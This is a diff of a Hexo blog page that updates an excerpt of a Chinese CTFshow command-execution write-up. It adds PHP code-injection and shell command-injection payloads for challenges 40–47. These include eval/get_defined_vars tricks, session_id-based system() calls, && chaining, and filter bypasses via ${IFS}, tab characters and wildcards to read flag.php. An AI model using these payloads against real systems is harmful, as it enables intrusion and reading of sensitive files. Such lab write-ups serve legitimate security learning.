@@ -49,7 +49,7 @@ window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 6.0.0"></he
           <a href="#栈和队列" class="heading-link"><i class="fas fa-link"></i></a><a href="#栈和队列" class="headerlink" title="栈和队列"></a>栈和队列</h3>
       <figure class="highlight c++"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//栈只能在表尾进行插入和删除</span></span><br><span class="line"><span class="comment">//队列只能在表尾插入，表头删除</span></span><br></pre></td></tr></table></div></figure>
 
-</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2022/02/07/CTFshow%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">CTFshow命令执行</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">发表于</span><span class="post-meta-item__value">2022-02-07</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">更新于</span><span class="post-meta-item__value">2022-02-14</span></span><span class="post-meta-item post-meta-item--visitors leancloud_visitors" id="/2022/02/07/CTFshow%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" data-flag-title="CTFshow命令执行"><span class="post-meta-item__icon"><i class="fas fa-eye"></i></span><span class="post-meta-item__info">阅读次数</span><span class="post-meta-item__value leancloud-visitors-count"></span></span></div></header><div class="post-body"><div class="post-excerpt"><p>可用于执行php函数的函数：</p>
+</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2022/02/07/CTFshow%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">CTFshow命令执行</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">发表于</span><span class="post-meta-item__value">2022-02-07</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">更新于</span><span class="post-meta-item__value">2022-03-07</span></span><span class="post-meta-item post-meta-item--visitors leancloud_visitors" id="/2022/02/07/CTFshow%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" data-flag-title="CTFshow命令执行"><span class="post-meta-item__icon"><i class="fas fa-eye"></i></span><span class="post-meta-item__info">阅读次数</span><span class="post-meta-item__value leancloud-visitors-count"></span></span></div></header><div class="post-body"><div class="post-excerpt"><p>可用于执行php函数的函数：</p>
 <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">eval()、assert()、preg_replace(&quot;/test/e&quot;,$_POST[&quot;cmd&quot;],&quot;jutst test&quot;)</span><br><span class="line">//正则规则中含有/e修饰符就存在代码执行漏洞</span><br><span class="line">create_function()</span><br></pre></td></tr></table></div></figure>
 
 <p>可用于执行系统命令的函数：</p>
@@ -60,6 +60,9 @@ window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 6.0.0"></he
 
 <p>可用于读取文件的命令：</p>
 <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">cat</span><br><span class="line">tac</span><br><span class="line">head</span><br><span class="line">more</span><br><span class="line">less</span><br><span class="line">cut</span><br></pre></td></tr></table></div></figure>
+
+<p>通配符：</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">*代表任意位</span><br><span class="line">?代表一位</span><br></pre></td></tr></table></div></figure>
 
 
 
@@ -129,6 +132,48 @@ window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 6.0.0"></he
       <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:?c=data://text/plain,&lt;?php system(&quot;cat fla*.php&quot;);?&gt;</span><br></pre></td></tr></table></div></figure>
 
 <p>过滤了flag并且包含的是变量c.php，输入后相当于直接执行输入的PHP命令，由于前面的PHP内容已经闭合，所以后面的.php直接就是.php文本显示，对前面的命令输入没有影响</p>
+<p>40</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload:?c=eval(array_pop(next(get_defined_vars())));</span><br><span class="line"></span><br><span class="line">POST:a=system(&#x27;cat flag.php&#x27;);</span><br></pre></td></tr></table></div></figure>
+
+<p>print_r(get_defined_vars());可以拿到所有已经定义的变量并取得值</p>
+<p>next(变量)可以获得下一个变量</p>
+<p>array_pop(数组)弹出数组中的变量为单个独立变量</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">c=session_start();system(session_id());</span><br><span class="line">passid=ls</span><br></pre></td></tr></table></div></figure>
+
+<p>本地修改sessionID传入命令</p>
+<p>41</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></div></figure>
+
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-/i&#x27;</span><br></pre></td></tr></table></div></figure>
+
+<p>可以发现大多数自负都被过滤，查看提示</p>
+<p>通过脚本可获取异或（｜）后能得到的所有字符</p>
+<p>直接使用脚本</p>
+<p>42</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:?c=cat flag.php;</span><br></pre></td></tr></table></div></figure>
+
+<p>$c.” &gt;/dev/null 2&gt;&amp;1”</p>
+<p>题目中将命令输出保存到黑洞中，可通过分号分割命令让第一个执行的命令直接显示</p>
+<p>43</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:?c=tac%20flag.php%26%26</span><br></pre></td></tr></table></div></figure>
+
+<p>同上题，过滤了cat和分号，通过&amp;&amp;也可进行多命令执行，要进行URL编码</p>
+<p>44</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:?c=tac%20fla*.php%26%26</span><br></pre></td></tr></table></div></figure>
+
+<p>同上题，过滤了flag，使用通配符</p>
+<p>45</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:?c=tac$&#123;IFS&#125;fla*.php%26%26</span><br></pre></td></tr></table></div></figure>
+
+<p>同上题，过滤了空格，找个能替代的就行</p>
+<p>46</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:?c=tac%09fla?.php%26%26</span><br></pre></td></tr></table></div></figure>
+
+<p>同上题，过滤了*和$，使用%09（制表符）替代空格</p>
+<p>47</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:?c=tac%09fla?.php%26%26</span><br></pre></td></tr></table></div></figure>
+
+<p>同上题，过滤了一些读取文件的命令，但没滤tac，直接用</p>
 </div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2022/02/04/Web-python-template-injection/">Web_python_template_injection</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">发表于</span><span class="post-meta-item__value">2022-02-04</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">更新于</span><span class="post-meta-item__value">2022-02-14</span></span><span class="post-meta-item post-meta-item--visitors leancloud_visitors" id="/2022/02/04/Web-python-template-injection/" data-flag-title="Web_python_template_injection"><span class="post-meta-item__icon"><i class="fas fa-eye"></i></span><span class="post-meta-item__info">阅读次数</span><span class="post-meta-item__value leancloud-visitors-count"></span></span></div></header><div class="post-body"><div class="post-excerpt"><h1 id="Python模版注入"   >
           <a href="#Python模版注入" class="heading-link"><i class="fas fa-link"></i></a><a href="#Python模版注入" class="headerlink" title="Python模版注入"></a>Python模版注入</h1>
       
